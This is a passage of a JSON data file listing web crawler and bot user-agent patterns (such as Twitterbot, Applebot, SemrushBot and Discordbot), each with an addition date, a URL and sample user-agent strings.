      "psbot-image (+http://www.picsearch.com/bot.html)",
      "psbot-page (+http://www.picsearch.com/bot.html)",
      "psbot/0.1 (+http://www.picsearch.com/bot.html)"
    ]
  }
  ,
  {
    "pattern": "InterfaxScanBot",
    "addition_date": "2014/03/31",
    "url": "http://scan-interfax.ru",
    "instances": []
  }
  ,
  {
    "pattern": "CC Metadata Scaper",
    "addition_date": "2014/04/01",
    "url": "http://wiki.creativecommons.org/Metadata_Scraper",
    "instances": [
      "CC Metadata Scaper http://wiki.creativecommons.org/Metadata_Scraper"
    ]
  }
  ,
  {
    "pattern": "g00g1e.net",
    "addition_date": "2014/04/01",
    "url": "http://www.g00g1e.net/",
    "instances": []
  }
  ,
  {
    "pattern": "GrapeshotCrawler",
    "addition_date": "2014/04/01",
    "url": "http://www.grapeshot.co.uk/crawler.php",
    "instances": [
      "Mozilla/5.0 (compatible; GrapeshotCrawler/2.0; +http://www.grapeshot.co.uk/crawler.php)"
    ]
  }
  ,
  {
    "pattern": "urlappendbot",
    "addition_date": "2014/05/10",
    "url": "http://www.profound.net/urlappendbot.html",
    "instances": [
      "Mozilla/5.0 (compatible; URLAppendBot/1.0; +http://www.profound.net/urlappendbot.html)"
    ]
  }
  ,
  {
    "pattern": "brainobot",
    "addition_date": "2014/06/24",
    "instances": []
  }
  ,
  {
    "pattern": "fr-crawler",
    "addition_date": "2014/07/31",
    "instances": [
      "Mozilla/5.0 (compatible; fr-crawler/1.1)"
    ]
  }
  ,
  {
    "pattern": "binlar",
    "addition_date": "2014/09/12",
    "instances": [
      "binlar_2.6.3 binlar2.6.3@unspecified.mail",
      "binlar_2.6.3 binlar_2.6.3@unspecified.mail",
      "binlar_2.6.3 larbin2.6.3@unspecified.mail",
      "binlar_2.6.3 phanendra_kalapala@McAfee.com",
      "binlar_2.6.3 test@mgmt.mic"
    ]
  }
  ,
  {
    "pattern": "SimpleCrawler",
    "addition_date": "2014/09/12",
    "instances": [
      "SimpleCrawler/0.1"
    ]
  }
  ,
  {
    "pattern": "Twitterbot",
    "addition_date": "2014/09/12",
    "url": "https://dev.twitter.com/cards/getting-started",
    "instances": [
      "Twitterbot/0.1",
      "Twitterbot/1.0"
    ]
  }
  ,
  {
    "pattern": "cXensebot",
    "addition_date": "2014/10/05",
    "instances": [
      "cXensebot/1.1a"
    ],
    "url": "http://www.cxense.com/bot.html"
  }
  ,
  {
    "pattern": "smtbot",
    "addition_date": "2014/10/04",
    "instances": [
      "Mozilla/5.0 (compatible; SMTBot/1.0; +http://www.similartech.com/smtbot)",
      "SMTBot (similartech.com/smtbot)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko)                 Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; SMTBot/1.0; +http://www.similartech.com/smtbot)",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36 (compatible; SMTBot/1.0; +http://www.similartech.com/smtbot)",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36 (compatible; SMTBot/1.0; http://www.similartech.com/smtbot)"
    ],
    "url": "http://www.similartech.com/smtbot"
  }
  ,
  {
    "pattern": "bnf.fr_bot",
    "addition_date": "2014/11/18",
    "url": "http://www.bnf.fr/fr/outils/a.dl_web_capture_robot.html",
    "instances": [
      "Mozilla/5.0 (compatible; bnf.fr_bot; +http://bibnum.bnf.fr/robot/bnf.html)",
      "Mozilla/5.0 (compatible; bnf.fr_bot; +http://www.bnf.fr/fr/outils/a.dl_web_capture_robot.html)"
    ]
  }
  ,
  {
    "pattern": "A6-Indexer",
    "addition_date": "2014/12/05",
    "url": "http://www.a6corp.com/a6-web-scraping-policy/",
    "instances": [
      "A6-Indexer"
    ]
  }
  ,
  {
    "pattern": "ADmantX",
    "addition_date": "2014/12/05",
    "url": "http://www.admantx.com",
    "instances": [
      "ADmantX Platform Semantic Analyzer - ADmantX Inc. - www.admantx.com - support@admantx.com"
    ]
  }
  ,
  {
    "pattern": "Facebot",
    "url": "https://developers.facebook.com/docs/sharing/best-practices#crawl",
    "addition_date": "2014/12/30",
    "instances": [
      "Facebot/1.0"
    ]
  }
  ,
  {
    "pattern": "OrangeBot\\/",
    "instances": [
      "Mozilla/5.0 (compatible; OrangeBot/2.0; support.orangebot@orange.com"
    ],
    "addition_date": "2015/01/12"
  }
  ,
  {
    "pattern": "memorybot",
    "url": "http://mignify.com/bot.htm",
    "instances": [
      "Mozilla/5.0 (compatible; memorybot/1.21.14 +http://mignify.com/bot.html)"
    ],
    "addition_date": "2015/02/01"
  }
  ,
  {
    "pattern": "AdvBot",
    "url": "http://advbot.net/bot.html",
    "instances": [
      "Mozilla/5.0 (compatible; AdvBot/2.0; +http://advbot.net/bot.html)"
    ],
    "addition_date": "2015/02/01"
  }
  ,
  {
    "pattern": "MegaIndex",
    "url": "https://www.megaindex.ru/?tab=linkAnalyze",
    "instances": [
      "Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +https://www.megaindex.ru/?tab=linkAnalyze)",
      "Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http://megaindex.com/crawler)"
    ],
    "addition_date": "2015/03/28"
  }
  ,
  {
    "pattern": "SemanticScholarBot",
    "url": "https://www.semanticscholar.org/crawler",
    "instances": [
      "SemanticScholarBot/1.0 (+http://s2.allenai.org/bot.html)",
      "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
    ],
    "addition_date": "2015/03/28"
  }
  ,
  {
    "pattern": "ltx71",
    "url": "http://ltx71.com/",
    "instances": [
      "ltx71 - (http://ltx71.com/)"
    ],
    "addition_date": "2015/04/04"
  }
  ,
  {
    "pattern": "nerdybot",
    "url": "http://nerdybot.com/",
    "instances": [
      "nerdybot"
    ],
    "addition_date": "2015/04/05"
  }
  ,
  {
    "pattern": "xovibot",
    "url": "http://www.xovibot.net/",
    "instances": [
      "Mozilla/5.0 (compatible; XoviBot/2.0; +http://www.xovibot.net/)"
    ],
    "addition_date": "2015/04/05"
  }
  ,
  {
    "pattern": "BUbiNG",
    "url": "http://law.di.unimi.it/BUbiNG.html",
    "instances": [
      "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
    ],
    "addition_date": "2015/04/06"
  }
  ,
  {
    "pattern": "Qwantify",
    "url": "https://www.qwant.com/",
    "instances": [
      "Mozilla/5.0 (compatible; Qwantify/2.0n; +https://www.qwant.com/)/*",
      "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w",
      "Mozilla/5.0 (compatible; Qwantify/Bleriot/1.1; +https://help.qwant.com/bot)",
      "Mozilla/5.0 (compatible; Qwantify/Bleriot/1.2.1; +https://help.qwant.com/bot)"
    ],
    "addition_date": "2015/04/06"
  }
  ,
  {
    "pattern": "archive.org_bot",
    "url": "http://www.archive.org/details/archive.org_bot",
    "depends_on": ["heritrix"],
    "instances": [
      "Mozilla/5.0 (compatible; heritrix/3.1.1-SNAPSHOT-20120116.200628 +http://www.archive.org/details/archive.org_bot)",
      "Mozilla/5.0 (compatible; archive.org_bot/heritrix-1.15.4 +http://www.archive.org)",
      "Mozilla/5.0 (compatible; heritrix/3.3.0-SNAPSHOT-20140702-2247 +http://archive.org/details/archive.org_bot)",
      "Mozilla/5.0 (compatible; archive.org_bot +http://www.archive.org/details/archive.org_bot)",
      "Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot)",
      "Mozilla/5.0 (compatible; special_archiver/3.1.1 +http://www.archive.org/details/archive.org_bot)"
    ],
    "addition_date": "2015/04/14"
  }
  ,
  {
    "pattern": "Applebot",
    "url": "http://www.apple.com/go/applebot",
    "addition_date": "2015/04/15",
    "instances": [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1)",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)",
      "Mozilla/5.0 (compatible; Applebot/0.3; +http://www.apple.com/go/applebot)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Applebot/0.3; +http://www.apple.com/go/applebot)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4 (Applebot/0.1; +http://www.apple.com/go/applebot)"
    ]
  }
  ,
  {
    "pattern": "TweetmemeBot",
    "url": "http://datasift.com/bot.html",
    "instances": [
      "Mozilla/5.0 (TweetmemeBot/4.0; +http://datasift.com/bot.html) Gecko/20100101 Firefox/31.0"
    ],
    "addition_date": "2015/04/15"
  }
  ,
  {
    "pattern": "crawler4j",
    "url": "https://github.com/yasserg/crawler4j",
    "instances": [
      "crawler4j (http://code.google.com/p/crawler4j/)",
      "crawler4j (https://github.com/yasserg/crawler4j/)"
    ],
    "addition_date": "2015/05/07"
  }
  ,
  {
    "pattern": "findxbot",
    "url": "http://www.findxbot.com",
    "instances": [
      "Mozilla/5.0 (compatible; Findxbot/1.0; +http://www.findxbot.com)"
    ],
    "addition_date": "2015/05/07"
  }
  ,
  {
    "pattern": "S[eE][mM]rushBot",
    "url": "http://www.semrush.com/bot.html",
    "instances": [
      "Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http://www.semrush.com/bot.html)",
      "Mozilla/5.0 (compatible; SemrushBot-SI/0.97; +http://www.semrush.com/bot.html)",
      "Mozilla/5.0 (compatible; SemrushBot/3~bl; +http://www.semrush.com/bot.html)",
      "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)",
      "Mozilla/5.0 (compatible; SemrushBot-BA; +http://www.semrush.com/bot.html)",
      "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)",
      "SEMrushBot"
    ],
    "addition_date": "2015/05/26"
  }
  ,
  {
    "pattern": "yoozBot",
    "url": "http://yooz.ir",
    "instances": [
      "Mozilla/5.0 (compatible; yoozBot-2.2; http://yooz.ir; info@yooz.ir)"
    ],
    "addition_date": "2015/05/26"
  }
  ,
  {
    "pattern": "lipperhey",
    "url": "http://www.lipperhey.com/",
    "instances": [
      "Mozilla/5.0 (compatible; Lipperhey Link Explorer; http://www.lipperhey.com/)",
      "Mozilla/5.0 (compatible; Lipperhey SEO Service; http://www.lipperhey.com/)",
      "Mozilla/5.0 (compatible; Lipperhey Site Explorer; http://www.lipperhey.com/)",
      "Mozilla/5.0 (compatible; Lipperhey-Kaus-Australis/5.0; +https://www.lipperhey.com/en/about/)"
    ],
    "addition_date": "2015/08/26"
  }
  ,
  {
    "pattern": "Y!J",
    "url": "https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/~/%E3%82%A6%E3%82%A7%E3%83%96%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%AB%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%99%E3%82%8B%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%81%AE%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%82%A8%E3%83%BC%E3%82%B8%E3%82%A7%E3%83%B3%E3%83%88%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6",
    "instances": [
      "Y!J-ASR/0.1 crawler (http://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)",
      "Y!J-BRJ/YATS crawler (http://help.yahoo.co.jp/help/jp/search/indexing/indexing-15.html)",
      "Y!J-PSC/1.0 crawler (http://help.yahoo.co.jp/help/jp/search/indexing/indexing-15.html)",
      "Y!J-BRW/1.0 crawler (http://help.yahoo.co.jp/help/jp/search/indexing/indexing-15.html)",
      "Mozilla/5.0 (iPhone; Y!J-BRY/YATSH crawler; http://help.yahoo.co.jp/help/jp/search/indexing/indexing-15.html)",
      "Mozilla/5.0 (compatible; Y!J SearchMonkey/1.0 (Y!J-AGENT; http://help.yahoo.co.jp/help/jp/search/indexing/indexing-15.html))"
    ],
    "addition_date": "2015/05/26"
  }
  ,
  {
    "pattern": "Domain Re-Animator Bot",
    "url": "http://domainreanimator.com",
    "instances": [
      "Domain Re-Animator Bot (http://domainreanimator.com) - support@domainreanimator.com"
    ],
    "addition_date": "2015/04/14"
  }
  ,
  {
    "pattern": "AddThis",
    "url": "https://www.addthis.com",
    "instances": [
      "AddThis.com robot tech.support@clearspring.com"
    ],
    "addition_date": "2015/06/02"
  }
  ,
  {
    "pattern": "Screaming Frog SEO Spider",
    "url": "http://www.screamingfrog.co.uk/seo-spider",
    "instances": [
      "Screaming Frog SEO Spider/5.1"
    ],
    "addition_date": "2016/01/08"
  }
  ,
  {
    "pattern": "MetaURI",
    "url": "http://www.useragentstring.com/MetaURI_id_17683.php",
    "instances": [
      "MetaURI API/2.0 +metauri.com"
    ],
    "addition_date": "2016/01/02"
  }
  ,
  {
    "pattern": "Scrapy",
    "url": "http://scrapy.org/",
    "instances": [
      "Scrapy/1.0.3 (+http://scrapy.org)"
    ],
    "addition_date": "2016/01/02"
  }
  ,
  {
    "pattern": "Livelap[bB]ot",
    "url": "http://site.livelap.com/crawler",
    "instances": [
      "LivelapBot/0.2 (http://site.livelap.com/crawler)",
      "Livelapbot/0.1"
    ],
    "addition_date": "2016/01/02"
  }
  ,
  {
    "pattern": "OpenHoseBot",
    "url": "http://www.openhose.org/bot.html",
    "instances": [
      "Mozilla/5.0 (compatible; OpenHoseBot/2.1; +http://www.openhose.org/bot.html)"
    ],
    "addition_date": "2016/01/02"
  }
  ,
  {
    "pattern": "CapsuleChecker",
    "url": "http://www.capsulink.com/about",
    "instances": [
      "CapsuleChecker (http://www.capsulink.com/)"
    ],
    "addition_date": "2016/01/02"
  }
  ,
  {
    "pattern": "collection@infegy.com",
    "url": "http://infegy.com/",
    "instances": [
      "Mozilla/5.0 (compatible) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 collection@infegy.com"
    ],
    "addition_date": "2016/01/03"
  }
  ,
  {
    "pattern": "IstellaBot",
    "url": "http://www.tiscali.it/",
    "instances": [
      "Mozilla/5.0 (compatible; IstellaBot/1.23.15 +http://www.tiscali.it/)"
    ],
    "addition_date": "2016/01/09"
  }
  ,
  {
    "pattern": "DeuSu\\/",
    "addition_date": "2016/01/23",
    "url": "https://deusu.de/robot.html",
    "instances": [
      "Mozilla/5.0 (compatible; DeuSu/0.1.0; +https://deusu.org)",
      "Mozilla/5.0 (compatible; DeuSu/5.0.2; +https://deusu.de/robot.html)"
    ]
  }
  ,
  {
    "pattern": "betaBot",
    "addition_date": "2016/01/23",
    "instances": []
  }
  ,
  {
    "pattern": "Cliqzbot\\/",
    "addition_date": "2016/01/23",
    "url": "http://cliqz.com/company/cliqzbot",
    "instances": [
      "Mozilla/5.0 (compatible; Cliqzbot/2.0; +http://cliqz.com/company/cliqzbot)",
      "Cliqzbot/0.1 (+http://cliqz.com +cliqzbot@cliqz.com)",
      "Cliqzbot/0.1 (+http://cliqz.com/company/cliqzbot)",
      "Mozilla/5.0 (compatible; Cliqzbot/0.1 +http://cliqz.com/company/cliqzbot)",
      "Mozilla/5.0 (compatible; Cliqzbot/1.0 +http://cliqz.com/company/cliqzbot)"
    ]
  }
  ,
  {
    "pattern": "MojeekBot\\/",
    "addition_date": "2016/01/23",
    "url": "https://www.mojeek.com/bot.html",
    "instances": [
      "MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)",
      "Mozilla/5.0 (compatible; MojeekBot/0.2; http://www.mojeek.com/bot.html#relaunch)",
      "Mozilla/5.0 (compatible; MojeekBot/0.2; http://www.mojeek.com/bot.html)",
      "Mozilla/5.0 (compatible; MojeekBot/0.5; http://www.mojeek.com/bot.html)",
      "Mozilla/5.0 (compatible; MojeekBot/0.6; +https://www.mojeek.com/bot.html)",
      "Mozilla/5.0 (compatible; MojeekBot/0.6; http://www.mojeek.com/bot.html)"
    ]
  }
  ,
  {
    "pattern": "netEstate NE Crawler",
    "addition_date": "2016/01/23",
    "url": "+http://www.website-datenbank.de/",
    "instances": [
      "netEstate NE Crawler (+http://www.sengine.info/)",
      "netEstate NE Crawler (+http://www.website-datenbank.de/)"
    ]
  }
  ,
  {
    "pattern": "SafeSearch microdata crawler",
    "addition_date": "2016/01/23",
    "url": "https://safesearch.avira.com",
    "instances": [
      "SafeSearch microdata crawler (https://safesearch.avira.com, safesearch-abuse@avira.com)"
    ]
  }
  ,
  {
    "pattern": "Gluten Free Crawler\\/",
    "addition_date": "2016/01/23",
    "url": "http://glutenfreepleasure.com/",
    "instances": [
      "Mozilla/5.0 (compatible; Gluten Free Crawler/1.0; +http://glutenfreepleasure.com/)"
    ]
  }
  ,
  {
    "pattern": "Sonic",
    "addition_date": "2016/02/08",
    "url": "http://www.yama.info.waseda.ac.jp/~crawler/info.html",
    "instances": [
      "Mozilla/5.0 (compatible; RankSonicSiteAuditor/1.0; +https://ranksonic.com/ranksonic_sab.html)",
      "Mozilla/5.0 (compatible; Sonic/1.0; http://www.yama.info.waseda.ac.jp/~crawler/info.html)",
      "Mozzila/5.0 (compatible; Sonic/1.0; http://www.yama.info.waseda.ac.jp/~crawler/info.html)"
    ]
  }
  ,
  {
    "pattern": "Sysomos",
    "addition_date": "2016/02/08",
    "url": "http://www.sysomos.com",
    "instances": [
      "Mozilla/5.0 (compatible; Sysomos/1.0; +http://www.sysomos.com/; Sysomos)"
    ]
  }
  ,
  {
    "pattern": "Trove",
    "addition_date": "2016/02/08",
    "url": "http://www.trove.com",
    "instances": []
  }
  ,
  {
    "pattern": "deadlinkchecker",
    "addition_date": "2016/02/08",
    "url": "http://www.deadlinkchecker.com",
    "instances": [
      "www.deadlinkchecker.com Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
      "www.deadlinkchecker.com XMLHTTP/1.0",
      "www.deadlinkchecker.com XMLHTTP/1.0 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
    ]
  }
  ,
  {
    "pattern": "Slack-ImgProxy",
    "addition_date": "2016/04/25",
    "url": "https://api.slack.com/robots",
    "instances": [
      "Slack-ImgProxy (+https://api.slack.com/robots)",
      "Slack-ImgProxy 0.59 (+https://api.slack.com/robots)",
      "Slack-ImgProxy 0.66 (+https://api.slack.com/robots)",
      "Slack-ImgProxy 1.106 (+https://api.slack.com/robots)",
      "Slack-ImgProxy 1.138 (+https://api.slack.com/robots)",
      "Slack-ImgProxy 149 (+https://api.slack.com/robots)"
    ]
  }
  ,
  {
    "pattern": "Embedly",
    "addition_date": "2016/04/25",
    "url": "http://support.embed.ly",
    "instances": [
      "Embedly +support@embed.ly",
      "Mozilla/5.0 (compatible; Embedly/0.2; +http://support.embed.ly/)",
      "Mozilla/5.0 (compatible; Embedly/0.2; snap; +http://support.embed.ly/)"
    ]
  }
  ,
  {
    "pattern": "RankActiveLinkBot",
    "addition_date": "2016/06/20",
    "url": "https://rankactive.com/resources/rankactive-linkbot",
    "instances": [
      "Mozilla/5.0 (compatible; RankActiveLinkBot; +https://rankactive.com/resources/rankactive-linkbot)"
    ]
  }
  ,
  {
    "pattern": "iskanie",
    "addition_date": "2016/09/02",
    "url": "http://www.iskanie.com",
    "instances": [
      "iskanie (+http://www.iskanie.com)"
    ]
  }
  ,
  {
    "pattern": "SafeDNSBot",
    "addition_date": "2016/09/10",
    "url": "https://www.safedns.com/searchbot",
    "instances": [
      "SafeDNSBot (https://www.safedns.com/searchbot)"
    ]
  }
  ,
  {
    "pattern": "SkypeUriPreview",
    "addition_date": "2016/10/10",
    "instances": [
      "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
    ]
  }
  ,
  {
    "pattern": "Veoozbot",
    "addition_date": "2016/11/03",
    "url": "http://www.veooz.com/veoozbot.html",
    "instances": [
      "Mozilla/5.0 (compatible; Veoozbot/1.0; +http://www.veooz.com/veoozbot.html)"
    ]
  }
  ,
  {
    "pattern": "Slackbot",
    "addition_date": "2016/11/03",
    "url": "https://api.slack.com/robots",
    "instances": [
      "Slackbot-LinkExpanding (+https://api.slack.com/robots)",
      "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
      "Slackbot 1.0 (+https://api.slack.com/robots)"
    ]
  }
  ,
  {
    "pattern": "redditbot",
    "addition_date": "2016/11/03",
    "url": "http://www.reddit.com/feedback",
    "instances": [
      "Mozilla/5.0 (compatible; redditbot/1.0; +http://www.reddit.com/feedback)"
    ]
  }
  ,
  {
    "pattern": "datagnionbot",
    "addition_date": "2016/11/03",
    "url": "http://www.datagnion.com/bot.html",
    "instances": [
      "datagnionbot (+http://www.datagnion.com/bot.html)"
    ]
  }
  ,
  {
    "pattern": "Google-Adwords-Instant",
    "addition_date": "2016/11/03",
    "url": "http://www.google.com/adsbot.html",
    "instances": [
      "Google-Adwords-Instant (+http://www.google.com/adsbot.html)"
    ]
  }
  ,
  {
    "pattern": "adbeat_bot",
    "addition_date": "2016/11/04",
    "instances": [
      "Mozilla/5.0 (compatible; adbeat_bot; +support@adbeat.com; support@adbeat.com)",
      "adbeat_bot"
    ]
  }
  ,
  {
    "pattern": "WhatsApp",
    "addition_date": "2016/11/15",
    "url": "https://www.whatsapp.com/",
    "instances": [
      "WhatsApp",
      "WhatsApp/0.3.4479 N",
      "WhatsApp/0.3.4679 N",
      "WhatsApp/0.3.4941 N",
      "WhatsApp/2.12.15/i",
      "WhatsApp/2.12.16/i",
      "WhatsApp/2.12.17/i",
      "WhatsApp/2.12.449 A",
      "WhatsApp/2.12.453 A",
      "WhatsApp/2.12.510 A",
      "WhatsApp/2.12.540 A",
      "WhatsApp/2.12.548 A",
      "WhatsApp/2.12.555 A",
      "WhatsApp/2.12.556 A",
      "WhatsApp/2.16.1/i",
      "WhatsApp/2.16.13 A",
      "WhatsApp/2.16.2/i",
      "WhatsApp/2.16.42 A",
      "WhatsApp/2.16.57 A",
      "WhatsApp/2.19.92 i",
      "WhatsApp/2.19.175 A",
      "WhatsApp/2.19.244 A",
      "WhatsApp/2.19.258 A",
      "WhatsApp/2.19.308 A",
      "WhatsApp/2.19.330 A"
    ]
  }
  ,
  {
    "pattern": "contxbot",
    "addition_date": "2017/02/25",
    "instances": [
      "Mozilla/5.0 (compatible;contxbot/1.0)"
    ]
  }
  ,
  {
    "pattern": "pinterest.com.bot",
    "addition_date": "2017/03/03",
    "instances": [
      "Mozilla/5.0 (compatible; Pinterestbot/1.0; +http://www.pinterest.com/bot.html)",
      "Pinterest/0.2 (+http://www.pinterest.com/bot.html)"
    ],
    "url": "http://www.pinterest.com/bot.html"
  }
  ,
  {
    "pattern": "electricmonk",
    "addition_date": "2017/03/04",
    "instances": [
      "Mozilla/5.0 (compatible; electricmonk/3.2.0 +https://www.duedil.com/our-crawler/)"
    ],
    "url": "https://www.duedil.com/our-crawler/"
  }
  ,
  {
    "pattern": "GarlikCrawler",
    "addition_date": "2017/03/18",
    "instances": [
      "GarlikCrawler/1.2 (http://garlik.com/, crawler@garlik.com)"
    ],
    "url": "http://garlik.com/"
  }
  ,
  {
    "pattern": "BingPreview\\/",
    "addition_date": "2017/04/23",
    "url": "https://www.bing.com/webmaster/help/which-crawlers-does-bing-use-8c184ec0",
    "instances": [
      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b",
      "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0; BingPreview/1.0b) like Gecko",
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0;  WOW64;  Trident/6.0;  BingPreview/1.0b)",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  WOW64;  Trident/5.0;  BingPreview/1.0b)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
    ]
  }
  ,
  {
    "pattern": "vebidoobot",
    "addition_date": "2017/05/08",
    "instances": [
      "Mozilla/5.0 (compatible; vebidoobot/1.0; +https://blog.vebidoo.de/vebidoobot/"
    ],
    "url": "https://blog.vebidoo.de/vebidoobot/"
  }
  ,
  {
    "pattern": "FemtosearchBot",
    "addition_date": "2017/05/16",
    "instances": [
      "Mozilla/5.0 (compatible; FemtosearchBot/1.0; http://femtosearch.com)"
    ],
    "url": "http://femtosearch.com"
  }
  ,
  {
    "pattern": "Yahoo Link Preview",
    "addition_date": "2017/06/28",
    "instances": [
      "Mozilla/5.0 (compatible; Yahoo Link Preview; https://help.yahoo.com/kb/mail/yahoo-link-preview-SLN23615.html)"
    ],
    "url": "https://help.yahoo.com/kb/mail/yahoo-link-preview-SLN23615.html"
  }
  ,
  {
    "pattern": "MetaJobBot",
    "addition_date": "2017/08/16",
    "instances": [
      "Mozilla/5.0 (compatible; MetaJobBot; http://www.metajob.de/crawler)"
    ],
    "url": "http://www.metajob.de/the/crawler"
  }
  ,
  {
    "pattern": "DomainStatsBot",
    "addition_date": "2017/08/16",
    "instances": [
      "DomainStatsBot/1.0 (http://domainstats.io/our-bot)"
    ],
    "url": "http://domainstats.io/our-bot"
  }
  ,
  {
    "pattern": "mindUpBot",
    "addition_date": "2017/08/16",
    "instances": [
      "mindUpBot (datenbutler.de)"
    ],
    "url": "http://www.datenbutler.de/"
  }
  ,
  {
    "pattern": "Daum\\/",
    "addition_date": "2017/08/16",
    "instances": [
      "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
    ],
    "url": "http://cs.daum.net/faq/15/4118.html?faqId=28966"
  }
  ,
  {
    "pattern": "Jugendschutzprogramm-Crawler",
    "addition_date": "2017/08/16",
    "instances": [
      "Jugendschutzprogramm-Crawler; Info: http://www.jugendschutzprogramm.de"
    ],
    "url": "http://www.jugendschutzprogramm.de"
  }
  ,
  {
    "pattern": "Xenu Link Sleuth",
    "addition_date": "2017/08/19",
    "instances": [
      "Xenu Link Sleuth/1.3.8"
    ],
    "url": "http://home.snafu.de/tilman/xenulink.html"
  }
  ,
  {
    "pattern": "Pcore-HTTP",
    "addition_date": "2017/08/19",
    "instances": [
      "Pcore-HTTP/v0.40.3",
      "Pcore-HTTP/v0.44.0"
    ],
    "url": "https://bitbucket.org/softvisio/pcore/overview"
  }
  ,
  {
    "pattern": "moatbot",
    "addition_date": "2017/09/16",
    "instances": [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36 moatbot",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4 moatbot"
    ],
    "url": "https://moat.com"
  }
  ,
  {
    "pattern": "KosmioBot",
    "addition_date": "2017/09/16",
    "instances": [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36 (compatible; KosmioBot/1.0; +http://kosm.io/bot.html)"
    ],
    "url": "http://kosm.io/bot.html"
  }
  ,
  {
    "pattern": "pingdom",
    "addition_date": "2017/09/16",
    "instances": [
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/59.0.3071.109 Chrome/59.0.3071.109 Safari/537.36 PingdomPageSpeed/1.0 (pingbot/2.0; +http://www.pingdom.com/)",
      "Mozilla/5.0 (compatible; pingbot/2.0; +http://www.pingdom.com/)"
    ],
    "url": "http://www.pingdom.com"
  }
  ,
  {
    "pattern": "AppInsights",
    "addition_date": "2019/03/09",
    "instances": [
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; AppInsights)"
    ],
    "url": "https://docs.microsoft.com/en-us/azure/azure-monitor/app/app-insights-overview"
  }
  ,
  {
    "pattern": "PhantomJS",
    "addition_date": "2017/09/18",
    "instances": [
      "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1 bl.uk_lddc_renderbot/2.0.0 (+ http://www.bl.uk/aboutus/legaldeposit/websites/websites/faqswebmaster/index.html)"
    ],
    "url": "http://phantomjs.org/"
  }
  ,
  {
    "pattern": "Gowikibot",
    "addition_date": "2017/10/26",
    "instances": [
      "Mozilla/5.0 (compatible; Gowikibot/1.0; +http://www.gowikibot.com)"
    ],
    "url": "http://www.gowikibot.com"
  }
  ,
  {
    "pattern": "PiplBot",
    "addition_date": "2017/10/30",
    "instances": [
      "PiplBot (+http://www.pipl.com/bot/)",
      "Mozilla/5.0+(compatible;+PiplBot;+http://www.pipl.com/bot/)"
    ],
    "url": "http://www.pipl.com/bot/"
  }
  ,
  {
    "pattern": "Discordbot",
    "addition_date": "2017/09/22",
    "url": "https://discordapp.com",
    "instances": [
      "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)"
    ]
  }
  ,
  {
